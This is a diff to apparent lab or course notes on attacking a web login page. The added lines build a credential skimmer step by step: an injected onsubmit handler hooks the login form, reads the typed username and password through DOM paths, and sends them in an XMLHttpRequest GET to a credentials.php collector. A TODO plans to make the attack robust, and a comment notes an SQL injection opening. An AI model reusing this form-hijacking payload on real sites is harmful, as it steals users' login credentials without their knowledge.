@@ -78,6 +78,46 @@ leaves no trace of tampering, and sets an event listener for the onsubmit event 
 event listener to send us the credentials and log the user in.
 
 
+Do an Ajax GET to send username/password:
+
+xmlhttp = new XMLHttpRequest();
+xmlhttp.onreadystatechange = xhrHandler;
+xmlhttp.open('GET','http://localhost/credentials.php?username=user&password=pass',false);
+xmlhttp.send();
+
+function xhrHandler() {
+  if (this.readyState != 4) {
+      return;
+  }
+  if (this.status != 200) {
+      return;
+  }
+  var status = this.status;
+  var text = this.responseText;
+
+  alert(status + ": " + text);
+}
+
+compact: 
+function xhrHandler() { if (this.readyState != 4) { return; } if (this.status != 200) { return; } var status = this.status; var text = this.responseText; alert(status + ": " + text); }
+
+
+This works for sending and confirming reponse for a bogus username/password pair. 
+
+document.forms[0].setAttribute("onsubmit", "function xhrHandler() { if (this.readyState != 4) { return; } if (this.status != 200) { return; } var status = this.status; var text = this.responseText; alert(status + ': ' + text); } xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = xhrHandler; xmlhttp.open('GET','http://localhost/credentials.php?username=user&password=pass',false); xmlhttp.send();")
+
+
+
+Next is to get the real username/password pair here:
+
+username entered can be gotten by: document.forms[0].children[0].children[0].children[0].children[1].children[0].value
+password entered can be gotten by: document.forms[0].children[0].children[0].children[1].children[1].children[0].value
+
+
+
+This does the trick with the entered username and password:
+
+document.forms[0].setAttribute("onsubmit", "function xhrHandler() { if (this.readyState != 4) { return; } if (this.status != 200) { return; } var status = this.status; var text = this.responseText; alert(status + ': ' + text); } xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = xhrHandler; xmlhttp.open('GET','http://localhost/credentials.php?username=' + document.forms[0].children[0].children[0].children[0].children[1].children[0].value + '&password=' + document.forms[0].children[0].children[0].children[1].children[1].children[0].value,false); xmlhttp.send();")
 
 
 
@@ -90,8 +130,7 @@ event listener to send us the credentials and log the user in.
 
 
 
-
-
+// TODO: make attack resistant to user inputting incorrect username/password once and returning to the page again
 
 // can do SQL injection: see dump when entering a password
 
